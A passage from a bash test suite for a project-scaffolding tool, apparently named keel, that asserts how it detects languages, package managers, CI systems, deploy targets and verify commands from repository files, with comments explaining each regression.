# specific case". A table claiming the reverse misleads a reader about exactly the case its polyglot
# row exists to explain. Pre-existing, and out of scope for the Dart work that added the assertion
# above, which is why it is a follow-up rather than part of PR #49.
kt="$(grep -n '^| `build.gradle.kts`' "$mtx" | head -1 | cut -d: -f1)"
jv="$(grep -n '^| `pom.xml` or `build.gradle`' "$mtx" | head -1 | cut -d: -f1)"
if [ -z "$kt" ] || [ -z "$jv" ]; then
    bad "docs" "the detection matrix has no kotlin or java row, so this case proves nothing"
elif [ "$kt" -lt "$jv" ]; then
    ok "the detection matrix lists kotlin above java, as the chain orders them"
else
    bad "docs" "kotlin is listed at line $kt, below java at $jv, but detect_languages matches kotlin first"
fi

# `write-prd`'s mode table gives `from-repo`'s first read as a hardcoded `<docs_root>/snapshot.md`,
# three lines above the sentence that checks `profile.artifacts.prd` for exactly the same reason. A
# repository that maps its snapshot elsewhere is therefore ignored by the one skill built to consume
# it, and `artifacts.snapshot` is a key nothing reads. Pinned here because the asymmetry lived in one
# table on one screen for fourteen weeks without anyone seeing it.
wp="$ROOT/skills/write-prd/SKILL.md"
row="$(grep -F '| `from-repo` |' "$wp" | head -1)"
if [ -z "$row" ]; then
    bad "docs" "no from-repo row in write-prd/SKILL.md, so this case proves nothing"
elif printf '%s' "$row" | grep -q 'artifacts.snapshot'; then
    ok "write-prd's from-repo mode reads artifacts.snapshot before the default path"
else
    bad "docs" "write-prd's from-repo row still hardcodes the snapshot path: $row"
fi

# PL/SQL is the first language keel infers rather than reads from a manifest, so each clause of the
# marker gets its own assertion. A single happy-path test would pass with any one of them broken.
for stack in plsql plsql-nomarker plsql-notdominant plsql-pkg plsql-small plsql-upper plsql-hidden plsql-dotend ts-migrations; do
    d="$(fixture "$stack")"
    got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    case "$stack" in
      plsql)          want="plsql " ;;
      plsql-nomarker)    want="" ;;
      plsql-notdominant) want="" ;;
      plsql-pkg)         want="plsql " ;;
      plsql-small)    want="" ;;
      plsql-upper)       want="plsql " ;;
      plsql-hidden)      want="plsql " ;;
      plsql-dotend)      want="plsql " ;;
      ts-migrations)  want="typescript " ;;
    esac
    [ "$got" = "$want" ] && ok "detect_languages on $stack gives '${want:-nothing}'" \
      || bad "detects $stack" "got '$got', want '${want:-nothing}'"
    rm -rf "$d"
done

# Clause 4 of the marker, and the reason it exists. Each token gets its own case, because a single
# alternation test passes with two of the three patterns wrong.
#
# The %TYPE and %ROWTYPE case is the important one. Both were proposed as Oracle signals and
# rejected: PL/pgSQL supports them, so a detector keying on them mislabels every PostgreSQL
# migrations repository, which is the exact false positive this clause removes.
token_probe() {   # token_probe <file-content>
    local d got
    d="$(mktemp -d)"
    ( cd "$d" || exit 1
      i=1; while [ "$i" -le 12 ]; do printf 'CREATE TABLE t%s (id integer);\n' "$i" > "m$i.sql"; i=$((i+1)); done
      printf '%s\n' "$1" > marker.sql )
    got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    rm -rf "$d"
    printf '%s' "$got"
}

# The fields are separated by | rather than :, because := is PL/SQL's assignment operator and the
# first probe carrying one would split on its own content and assert on something it never wrote.
for probe in 'v VARCHAR2(30);|plsql |VARCHAR2' \
             'DBMS_OUTPUT.PUT_LINE(1);|plsql |DBMS_ prefix' \
             'CREATE OR REPLACE PACKAGE BODY p AS END;|plsql |PACKAGE BODY' \
             'v varchar2(30);|plsql |a lowercase token' \
             'DECLARE r t%ROWTYPE; v t.c%TYPE; BEGIN END;||PL/pgSQL %TYPE and %ROWTYPE' \
             'CREATE TABLE x (id integer);||plain SQL with no Oracle token'; do
    content="${probe%%|*}"; rest="${probe#*|}"; want="${rest%%|*}"; label="${rest#*|}"
    got="$(token_probe "$content")"
    [ "$got" = "$want" ] && ok "$label yields '${want:-nothing}'" \
      || bad "oracle token" "$label gave '$got', want '${want:-nothing}'"
done

# has_oracle_token's fallback used to pipe straight into `xargs -0 grep`. GNU xargs runs its command
# once even on zero input unless given -r, and grep with no file operand then reads the inherited
# stdin: a hang, not a quick "no match", and Linux-only, since BSD xargs does not invoke on empty
# input. This fixture reaches the fallback (an unreadable directory forces the primary grep past
# rc 1) with nothing for the fallback's own find to see, which is the exact shape that triggered it.
# The assertion could not be watched fail on this machine's BSD xargs, only reasoned from GNU's
# documented behaviour; it guards the return value and that the call does not block.
d="$(mktemp -d)"
( cd "$d" || exit 1
  mkdir -p blocked; : > blocked/unreadable
  chmod 000 blocked )
got="$( cd "$d" && bash -c '. "$1"; has_oracle_token; echo "rc=$?"' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
chmod 755 "$d/blocked"
[ "$got" = "rc=1" ] \
  && ok "has_oracle_token returns false rather than blocking with nothing for the fallback to scan" \
  || bad "has_oracle_token empty fallback" "got '$got', want 'rc=1'"
rm -rf "$d"

# NFR-01, NFR-02 and NFR-04, asserted as properties rather than as a clock. A timed test fails on a
# loaded CI runner for reasons unrelated to the code; these three do not.
#
# The census must not run at all on a project that declares itself, FR-04. The stub records itself
# in a file rather than exiting: sql_census is called through census="$(sql_census)", so an exit
# inside it only kills the substitution and the caller carries on, which is why the first version of
# this assertion passed even against a detect_languages that ran the census first. Verified
# 2026-08-18 against exactly that mutant.
d="$(fixture ts-migrations)"
sentinel="$d/census-ran"
got="$( cd "$d" && bash -c 'S="$2"; . "$1"; sql_census() { echo ran >> "$S"; printf "20 40\n"; }; detect_languages | tr "\n" " "' \
        _ "$ROOT/lib/detect-stack.sh" "$sentinel" 2>/dev/null )"
if [ "$got" = "typescript " ] && [ ! -f "$sentinel" ]; then
    ok "a declared project never reaches the census"
else
    bad "census ordering" "detect gave '$got' and the census $([ -f "$sentinel" ] && echo ran || echo did not run); want 'typescript ' and no census"
fi
rm -rf "$d"

# Vendored trees must not sway the count. Without the prune, 40 .js files under node_modules make
# .js the dominant extension and the Oracle repository stops being detected.
d="$(fixture plsql)"
mkdir -p "$d/node_modules/pkg"
i=1; while [ "$i" -le 40 ]; do printf 'x\n' > "$d/node_modules/pkg/f$i.js"; i=$((i+1)); done
got="$( cd "$d" && bash -c '. "$1"; detect_languages | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "plsql " ] && ok "node_modules is pruned from the census" \
  || bad "census prune" "got '$got'; vendored files were counted"
rm -rf "$d"

# The same for .git, which on a real repository holds far more files than the working tree.
d="$(fixture plsql)"
got="$( cd "$d" && bash -c '. "$1"; sql_census' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "${got##* }" = "1" ] && ok "the git directory is pruned from the census" \
  || bad "census prune" "largest other extension was '${got##* }', want 1; .git was counted"
rm -rf "$d"

# The APEX marker is keel's own output: lib/apex_render.py writes manifest.json with an apex_version
# key, pinned by tests/test-apex-export.sh. Keying on a file keel writes itself is why this cannot
# false-positive, and the third case is what keeps any other manifest.json from claiming it.
for spec in 'none::an ordinary PL/SQL project' \
            'apex:{"apex_version":"23.2"}:an APEX export tree' \
            'none:{"name":"something-else"}:a manifest.json that is not an APEX export' \
            'none:{"note":"apex_version"}:a manifest.json where apex_version is a value, not a key'; do
    want="${spec%%:*}"; rest="${spec#*:}"; manifest="${rest%:*}"; label="${rest##*:}"
    d="$(fixture plsql)"
    [ -n "$manifest" ] && printf '%s\n' "$manifest" > "$d/manifest.json"
    got="$( cd "$d" && bash -c '. "$1"; lang_profile plsql' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
    [ "$got" = "plsql oracle $want none" ] \
      && ok "$label gives framework $want" \
      || bad "lang_profile plsql" "$label gave '$got', want 'plsql oracle $want none'"
    rm -rf "$d"
done

# The end to end claim, which no other assertion makes: init writes the language into the profile.
# detect_languages returning plsql is not the same thing, and until lang_profile gained its arm the
# profile said unknown on a repository the detector had already classified.
d="$(fixture plsql)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(python3 -c "import json;s=json.load(open('$d/.keel/profile.json'))['stack'];print(s['language'],s['runtime'])" 2>/dev/null)"
[ "$got" = "plsql oracle" ] && ok "keel init writes plsql and oracle into the profile" \
  || bad "init plsql" "profile says '$got', want 'plsql oracle'"
rm -rf "$d"

# detect_datastores greps dependency manifests and returns early when there are none, so it can
# never reach a PL/SQL repository by its existing route. CON-04. This is a separate branch keyed on
# the language, not a ninth pair in the list, and the third case is what proves the existing route
# still works.
d="$(fixture plsql)"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "oracle " ] && ok "a PL/SQL project names oracle as its datastore" \
  || bad "datastores" "got '$got', want 'oracle '"
rm -rf "$d"

d="$(fixture ts-migrations)"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
case "$got" in
  *oracle*) bad "datastores" "a TypeScript project with .sql migrations was given oracle" ;;
  *)        ok "a project that is not PL/SQL gains no oracle datastore" ;;
esac
rm -rf "$d"

d="$(fixture python)"
printf 'psycopg2-binary==2.9\n' > "$d/requirements.txt"
got="$( cd "$d" && bash -c '. "$1"; detect_datastores | tr "\n" " "' _ "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
# Exact, not a substring. A `*postgres*` match passes while a second store appears beside it, and
# task 3 widened the postgres pair with `supabase`, so the thing this case is least able to afford
# is silence about what else it now matches.
[ "$got" = "postgres " ] && ok "the existing manifest-based datastore detection still works" \
  || bad "datastores" "a psycopg project gave '$got', want exactly 'postgres '"
rm -rf "$d"

# CON-02 and FR-08. utPLSQL runs inside a database and the connection string, schema and credentials
# are nowhere in the repository, so no command can be written. The fixture carries a real utPLSQL
# suite on purpose: it is the case most likely to tempt a future change into guessing one.
d="$(fixture plsql)"
mkdir -p "$d/tests"
printf 'BEGIN ut.run(); END;\n/\n' > "$d/tests/run_all_tests.sql"
got="$(detect_in "$d" 'for k in test test_one lint typecheck build; do detect_verify "$k"; done')"
[ -z "$got" ] && ok "a PL/SQL project gets no invented verify command" \
  || bad "verify" "these commands were invented rather than left null: $got"
rm -rf "$d"

# A Kotlin Gradle build was reported as java/spring: the build.gradle.kts branch was reached before
# anything looked for Kotlin, and the java branch hardcoded spring. Both halves are asserted here
# because fixing one without the other still writes a wrong profile.
d="$(fixture kotlin)"
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3,4')"
[ "$got" = "none gradle" ] && ok "a Kotlin build is not labelled spring" \
  || bad "detects kotlin" "framework and package manager were '$got', want 'none gradle'"
rm -rf "$d"

# A Maven project with no Spring dependency must not be called spring either.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '<project><groupId>f</groupId><artifactId>f</artifactId></project>\n' > pom.xml )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f3')"
[ "$got" = "none" ] && ok "a Maven project with no Spring dependency is framework none" \
  || bad "detects java" "framework '$got', want 'none'"
rm -rf "$d"

# The Kotlin DSL is the default build language for new Gradle builds whatever the project is
# written in, so the file name alone said Kotlin about plain Java projects. They then got
# `./gradlew compileKotlin`, a task that does not exist without the Kotlin plugin, so the typecheck
# gate failed the first time it ran. What the build applies is the marker, not what it is written in.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id("java") }\n' > build.gradle.kts
  mkdir -p src/main/java/com/example/app && printf 'class A {}\n' > src/main/java/com/example/app/A.java )
got="$(detect_in "$d" 'detect_stack | cut -d" " -f1')"
[ "$got" = "java" ] && ok "a Java project on the Kotlin DSL is still Java" \
  || bad "detects java" "language '$got', want 'java'"
rm -rf "$d"

# A Gradle build that does apply Kotlin, over a tree that also holds Java sources, is both. The
# depth bound was 4, and the conventional path src/main/java/<group>/<artifact>/A.java is 7, so the
# second language was never found and the mixed repo this branch exists for got one server.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'plugins { id "org.jetbrains.kotlin.jvm" }\n' > build.gradle
  mkdir -p src/main/java/com/example/app && printf 'class A {}\n' > src/main/java/com/example/app/A.java )
got="$(detect_in "$d" 'detect_languages | tr "\n" " "')"
[ "$got" = "kotlin java " ] && ok "a Kotlin build over a Java source tree records both" \
  || bad "detects kotlin" "got '$got', want 'kotlin java '"
rm -rf "$d"

# Verify commands are read from package.json, not guessed.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.test)"
[ "$got" = "npm test" ] && ok "reads verify.test from package.json scripts" || bad "verify.test" "got '$got'"
rm -rf "$d"

# A stack with no test script gets null, never a guess.
d="$(fixture go)"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
got="$(prof_of "$d" verify.lint)"
[ "$got" = "None" ] && ok "absent command is null, not guessed" || bad "null lint" "got '$got'"
rm -rf "$d"

# One verify command out of a profile, with null read as the empty string so a missing command and
# an empty one compare the same way.
verify_of() {   # verify_of <dir> <key>
    python3 -c "import json;v=json.load(open('$1/.keel/profile.json'))['verify']['$2'];print('' if v is None else v)" 2>/dev/null
}

# ---- javascript package managers and tooling -------------------------------
# Every pnpm, yarn and bun project was told to run npm. The lockfile is the declaration.
for pair in "pnpm-lock.yaml:pnpm" "yarn.lock:yarn" "bun.lockb:bun"; do
    lock="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    : > "$d/$lock"
    got="$(detect_in "$d" 'detect_stack | cut -d" " -f4')"
    lint="$(detect_in "$d" 'detect_verify lint')"
    [ "$got" = "$want" ] && ok "$lock means $want" || bad "js pm" "got '$got', want '$want'"
    case "$lint" in "$want"*) ok "$want runs the lint script with $want" ;;
      *) bad "js pm" "lint was '$lint'" ;; esac
    rm -rf "$d"
done

# `bun test` runs bun's own runner and ignores the package script, so bun is the one manager that
# must use `run` even for test. Getting this wrong runs a different test suite than the project's.
d="$(fixture node-ts)"
: > "$d/bun.lockb"
got="$(detect_in "$d" 'detect_verify test')"
[ "$got" = "bun run test" ] && ok "bun runs the declared test script, not its own runner" \
  || bad "js pm" "test was '$got'"
rm -rf "$d"

# ---- more than one lockfile is not a declaration ---------------------------
# Found by running init on a real project carrying both bun.lockb and package-lock.json. bun is
# checked first, so it won, and the profile got four `bun run` commands for a project whose own
# Dockerfile runs `npm ci` and on a machine with no bun installed at all. A precedence rule had
# been presented as a declaration. Two lockfiles mean the project has declared nothing, and the
# whole point of reading the lockfile is to stop guessing.

d="$(fixture node-ts)"
: > "$d/bun.lockb"; : > "$d/package-lock.json"
out="$( cd "$d" && "$KEEL" init -y 2>&1 )"
got="$(python3 -c "import json;v=json.load(open('$d/.keel/profile.json'))['stack']['package_manager'];print('null' if v is None else v)" 2>/dev/null)"
[ "$got" = null ] && ok "two lockfiles leave the package manager undeclared" \
  || bad "js pm" "package_manager was '$got', want null"
pm_leak=0
for k in test test_one lint typecheck build; do
    [ -n "$(verify_of "$d" "$k")" ] && { pm_leak=1; bad "js pm" "verify.$k was '$(verify_of "$d" "$k")' with two lockfiles"; }
done
[ "$pm_leak" -eq 0 ] && ok "and no verify command is guessed from either of them"
case "$out" in *stack.package_manager*) ok "init names the field to set by hand" ;;
  *) bad "js pm" "init printed no note naming stack.package_manager" ;; esac
# The note must not send the reader to --force: --force re-detects, so it would discard the value
# it just asked for and put the commands back to null. Checked here because the first draft did.
case "$out" in *stack.package_manager*--force*) bad "js pm" "the note tells the reader to --force, which discards what they set" ;;
  *) ok "and does not send them to --force, which would discard it" ;; esac
rm -rf "$d"

# ---- what runs the pipeline, and what it ships to --------------------------
# Found by running init on a real project holding a .gitlab-ci.yml and a Dockerfile: deploy.ci and
# deploy.target were written null unconditionally, so every reader had to go and look at files init
# had already walked past. A CI config is a declaration in the way a lockfile is, and it is read the
# same way, ambiguity included.

deploy_of() {   # deploy_of <dir> <key>
    python3 -c "import json;v=json.load(open('$1/.keel/profile.json'))['deploy']['$2'];print('null' if v is None else v)" 2>/dev/null
}

for pair in ".gitlab-ci.yml:gitlab-ci" "Jenkinsfile:jenkins" "azure-pipelines.yml:azure-pipelines" \
            ".circleci/config.yml:circleci" "bitbucket-pipelines.yml:bitbucket-pipelines"; do
    f="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    mkdir -p "$d/$(dirname "$f")"; : > "$d/$f"
    got="$(detect_in "$d" detect_ci)"
    [ "$got" = "$want" ] && ok "$f means $want" \
      || bad "deploy ci" "got '$got', want '$want'"
    rm -rf "$d"
done

# A directory of workflows, not a single file, so the marker is the directory having something in it.
d="$(fixture node-ts)"
mkdir -p "$d/.github/workflows"; : > "$d/.github/workflows/ci.yml"
( cd "$d" && "$KEEL" init -y >/dev/null 2>&1 )
[ "$(deploy_of "$d" ci)" = github-actions ] && ok "a workflow under .github/workflows means github-actions" \
  || bad "deploy ci" "got '$(deploy_of "$d" ci)'"
rm -rf "$d"

# An empty .github/workflows is what `git clone` leaves behind after the last workflow is deleted.
d="$(fixture node-ts)"
mkdir -p "$d/.github/workflows"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "an empty .github/workflows declares nothing" \
  || bad "deploy ci" "got '$got' from an empty workflows directory"
rm -rf "$d"

# Same rule as two lockfiles: two pipelines are not two declarations, they are none.
d="$(fixture node-ts)"
: > "$d/.gitlab-ci.yml"; mkdir -p "$d/.github/workflows"; : > "$d/.github/workflows/ci.yml"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "two pipeline configs leave the CI undeclared" \
  || bad "deploy ci" "got '$got' with two CI configs"
rm -rf "$d"

d="$(fixture node-ts)"
got="$(detect_in "$d" detect_ci)"
[ -z "$got" ] && ok "no pipeline config means null, not a guess" \
  || bad "deploy ci" "got '$got' with no CI config at all"
rm -rf "$d"

for pair in "fly.toml:fly" "vercel.json:vercel" "netlify.toml:netlify" "render.yaml:render"; do
    f="${pair%%:*}"; want="${pair##*:}"
    d="$(fixture node-ts)"
    : > "$d/$f"
    got="$(detect_in "$d" detect_deploy_target)"
    [ "$got" = "$want" ] && ok "$f means the target is $want" \
      || bad "deploy target" "got '$got', want '$want'"
    rm -rf "$d"
done

# The one that has to stay null. A Dockerfile says how the thing is packaged, never where it runs:
# the real project this came from has one and ships the image to a VM over ssh. Reading it as a
# target would be the lockfile mistake again, in a field nobody would think to check.
d="$(fixture node-ts)"
printf 'FROM alpine\n' > "$d/Dockerfile"
got="$(detect_in "$d" detect_deploy_target)"
[ -z "$got" ] && ok "a Dockerfile alone is not a deploy target" \
  || bad "deploy target" "a Dockerfile was read as target '$got'"
rm -rf "$d"

# Two platform manifests is a migration halfway done, and the same rule applies.
d="$(fixture node-ts)"
: > "$d/fly.toml"; : > "$d/vercel.json"
got="$(detect_in "$d" detect_deploy_target)"
[ -z "$got" ] && ok "two platform manifests leave the target undeclared" \
  || bad "deploy target" "got '$got' with two platform manifests"
rm -rf "$d"

# A declared typecheck script was detected and then thrown away for `npx tsc --noEmit`, which is a
# different command on any project whose script passes flags or points at a second tsconfig.
d="$(fixture node-ts)"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_typecheck" = "npm run typecheck" ] && ok "a declared typecheck script is the typecheck command" \
  || bad "js tooling" "typecheck was '$v_typecheck'"
rm -rf "$d"

# No script, but a tsconfig: tsc --noEmit is the fallback rather than nothing.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","devDependencies":{"typescript":"^5"}}\n' > package.json
  echo '{}' > tsconfig.json )
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_typecheck" = "npx tsc --noEmit" ] && ok "a tsconfig with no script still typechecks" \
  || bad "js tooling" "typecheck was '$v_typecheck'"
[ -z "$v_test" ] && ok "no test script and no runner declared means no test command" \
  || bad "js tooling" "test was guessed as '$v_test'"
rm -rf "$d"

# Biome and Prettier are declared by their config file, which is how the project says which it uses.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f"}\n' > package.json
  printf '{"linter":{"enabled":true}}\n' > biome.json )
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_format="$(detect_in "$d" 'detect_verify format')"
[ "$v_lint" = "npx biome check ." ] && ok "a biome.json is the lint command" \
  || bad "js tooling" "lint was '$v_lint'"
[ "$v_format" = "npx biome format ." ] && ok "biome is also the format check" \
  || bad "js tooling" "format was '$v_format'"
rm -rf "$d"

# `ls a* b*` exits non-zero when either operand matches nothing, so testing both Prettier config
# forms in one `ls` was an AND. A repo with the common .prettierrc and no prettier.config.js got
# null, which is the tool being declared and the command still missing.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f"}\n' > package.json
  printf '{"semi":false}\n' > .prettierrc )
v_format="$(detect_in "$d" 'detect_verify format')"
v_format_fix="$(detect_in "$d" 'detect_verify format_fix')"
[ "$v_format" = "npx prettier --check ." ] && ok "a .prettierrc alone is the format command" \
  || bad "js tooling" "format was '$v_format'"
[ "$v_format_fix" = "npx prettier --write ." ] && ok "a .prettierrc alone gives the writing variant too" \
  || bad "js tooling" "format_fix was '$v_format_fix'"
rm -rf "$d"

# A newline inside a script value must not lose the script itself. Every caller reads the value as
# a presence test and writes `npm run <name>`, never the body, so skipping the entry answers "there
# is no test command" for a project that declares one.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f","scripts":{"test":"echo a\\nfoo","lint":"eslint ."}}\n' > package.json )
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_test" = "npm test" ] \
  && ok "a script value spanning lines still detects the command" \
  || bad "js tooling" "test was '$v_test' on a package.json whose test script contains a newline"
[ "$v_lint" = "npm run lint" ] \
  && ok "a script value spanning lines does not disturb the scripts beside it" \
  || bad "js tooling" "lint was '$v_lint'"
rm -rf "$d"

# PKG_SCRIPTS_LOADED must mean loaded, not attempted. Priming the cache before the file exists and
# marking the load done leaves every later lookup in that process reading an empty cache. Exercised
# by sourcing the library, because bin/keel scaffolds package.json before it primes and so cannot
# reach this ordering today; one reordered line in cmd_new would.
d="$(mktemp -d)"
cat > "$d/probe.sh" <<'P'
have_python() { command -v python3 >/dev/null 2>&1; }
. "$1"
pkg_scripts_load
printf '{"name":"f","scripts":{"test":"jest"}}\n' > package.json
pkg_script test
P
got="$( cd "$d" && bash probe.sh "$ROOT/lib/detect-stack.sh" 2>/dev/null )"
[ "$got" = "jest" ] \
  && ok "a package.json written after the cache was primed is still read" \
  || bad "pkg_scripts_load" "pkg_script returned '$got'; the load was marked done against a missing package.json"
rm -rf "$d"

# ---- interpreter starts ----------------------------------------------------
# One interpreter start per npm script lookup, and detect_verify looks up to three times for each
# of ten verify keys. On a node project that was seventeen of init's twenty-four python3 starts,
# reading one small file seventeen times. The bound is asserted rather than the saving, because a
# saving in seconds is a property of the machine and a spawn count is a property of the code.
d="$(fixture node-ts)"
shimdir="$(mktemp -d)"
real_python="$(command -v python3)"
cat > "$shimdir/python3" <<SHIM
#!/bin/sh
printf 'x\n' >> "$shimdir/count"
exec "$real_python" "\$@"
SHIM
chmod +x "$shimdir/python3"
: > "$shimdir/count"
( cd "$d" && PATH="$shimdir:$PATH" "$KEEL" init >/dev/null 2>&1 )
spawns="$(grep -c x "$shimdir/count" 2>/dev/null || true)"
# The lower bound is not decoration: `grep -c` prints 0 on an empty count file, so a $KEEL that
# dies before it reaches an interpreter would otherwise report PASS. The suite already requires
# python3, so a real run cannot be at zero.
[ "${spawns:-99}" -ge 1 ] && [ "${spawns:-99}" -le 10 ] \
  && ok "keel init starts python3 at most 10 times ($spawns)" \
  || bad "interpreter starts" "keel init started python3 $spawns times on a node fixture. pkg_script and json_get are meant to read their file once each, not once per value"
rm -rf "$d" "$shimdir"

# Thirteen of doctor's nineteen interpreter starts were json_get reading one dotted path each from
# the same small file.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
shimdir="$(mktemp -d)"
real_python="$(command -v python3)"
cat > "$shimdir/python3" <<SHIM
#!/bin/sh
printf 'x\n' >> "$shimdir/count"
exec "$real_python" "\$@"
SHIM
chmod +x "$shimdir/python3"
: > "$shimdir/count"
( cd "$d" && PATH="$shimdir:$PATH" "$KEEL" doctor >/dev/null 2>&1 )
spawns="$(grep -c x "$shimdir/count" 2>/dev/null || true)"
[ "${spawns:-99}" -ge 1 ] && [ "${spawns:-99}" -le 10 ] \
  && ok "keel doctor starts python3 at most 10 times ($spawns)" \
  || bad "interpreter starts" "keel doctor started python3 $spawns times. json_get is meant to read the profile once, not once per field"
rm -rf "$d" "$shimdir"

# The absent/null distinction json_get's callers depend on. A cache that cannot tell them apart
# sends `project.kind` to its 'service' default on a profile that says 'docs'.
#
# test_integration, not build: the node-ts fixture declares a build script, so verify.build is set
# and would not test the null path at all.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
( cd "$d" && "$KEEL" profile get verify.test_integration >/dev/null 2>&1 ) \
  && ok "a null field reads as present and empty" \
  || bad "json_get contract" "verify.test_integration is null in the profile, and 'profile get' treated it as absent"
( cd "$d" && "$KEEL" profile get verify.nosuchfield >/dev/null 2>&1 ) \
  && bad "json_get contract" "verify.nosuchfield does not exist, and 'profile get' treated it as present" \
  || ok "an absent field is refused"
rm -rf "$d"

# The flattener joins segments with a dot, so `{"a.b": 1}` and `{"a":{"b":1}}` are the same cache
# line. `profile set` walks the real structure and refuses the first, and a `get` that accepts what
# `set` refuses is worse than one that refuses both.
d="$(fixture node-ts)"
( cd "$d" && "$KEEL" init >/dev/null 2>&1 )
python3 -c "import json;p='$d/.keel/profile.json';j=json.load(open(p));j['nested']={'a.b':1};json.dump(j,open(p,'w'))"
( cd "$d" && "$KEEL" profile get nested.a.b >/dev/null 2>&1 ) \
  && bad "json_get contract" "a literal 'a.b' key was served as the nested path nested.a.b, which 'profile set' refuses" \
  || ok "a literal dotted key is not served as a nested path"
rm -rf "$d"

# ---- python tooling --------------------------------------------------------
# pytest was written into every Python profile, declared or not. On a project that uses unittest
# `keel doctor` then fails on a command the project never had, which is the check crying wolf.
d="$(fixture python)"
v_test="$(detect_in "$d" 'detect_verify test')"
[ -z "$v_test" ] && ok "python without pytest declared gets no test command" \
  || bad "python" "test was guessed as '$v_test'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\ndependencies = []\n\n[dependency-groups]\ndev = ["pytest", "ruff", "pyright"]\n' > pyproject.toml
  : > uv.lock )
v_pm="$(detect_in "$d" 'detect_stack | cut -d" " -f4')"
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
[ "$v_pm" = "uv" ] \
  && ok "a uv.lock means uv" || bad "python" "package manager was not uv"
[ "$v_test" = "uv run pytest" ] && ok "uv runs pytest inside the project environment" \
  || bad "python" "test was '$v_test'"
[ "$v_typecheck" = "uv run pyright" ] && ok "pyright is honoured as the type checker" \
  || bad "python" "typecheck was '$v_typecheck'"
[ "$v_lint" = "uv run ruff check ." ] && ok "ruff is honoured under the project runner" \
  || bad "python" "lint was '$v_lint'"
rm -rf "$d"

d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf 'pytest\nflake8\nmypy\n' > requirements.txt
  mkdir -p tests )
v_test="$(detect_in "$d" 'detect_verify test')"
v_lint="$(detect_in "$d" 'detect_verify lint')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "pytest" ] && ok "plain pip runs pytest with no prefix" \
  || bad "python" "test was '$v_test'"
[ "$v_lint" = "flake8" ] && ok "flake8 in requirements.txt is the lint command" \
  || bad "python" "lint was '$v_lint'"
[ "$v_typecheck" = "mypy ." ] && ok "mypy is still honoured" \
  || bad "python" "typecheck was '$v_typecheck'"
rm -rf "$d"

# A project with a tests/ directory and no pytest anywhere runs the standard library runner.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '[project]\nname = "f"\n' > pyproject.toml
  mkdir -p tests && printf 'import unittest\n' > tests/test_f.py )
v_test="$(detect_in "$d" 'detect_verify test')"
[ "$v_test" = "python -m unittest discover" ] && ok "a tests dir with no pytest gets unittest" \
  || bad "python" "test was '$v_test'"
rm -rf "$d"

# ---- php, go and java, from declarations rather than from the machine -------
# PHP got no test command at all unless vendor/ happened to be installed, and vendor/ is gitignored
# on essentially every PHP project, so a fresh clone always produced an empty profile.
d="$(mktemp -d)"
( cd "$d" && git init -q -b main . && git config user.email t@t.t && git config user.name t
  printf '{"name":"f/f","require-dev":{"phpunit/phpunit":"^11","phpstan/phpstan":"^2"}}\n' > composer.json )
v_test="$(detect_in "$d" 'detect_verify test')"
v_typecheck="$(detect_in "$d" 'detect_verify typecheck')"
[ "$v_test" = "vendor/bin/phpunit" ] && ok "phpunit in composer.json is enough, with no vendor dir" \
  || bad "php" "test was '$v_test'"
[ "$v_typecheck" = "vendor/bin/phpstan analyse" ] && ok "phpstan is the PHP type checker" \
  || bad "php" "typecheck was '$v_typecheck'"
rm -rf "$d"

# Pest is a different runner and a different binary. A project that declares it must not be told
# to run phpunit.
d="$(mktemp -d)"
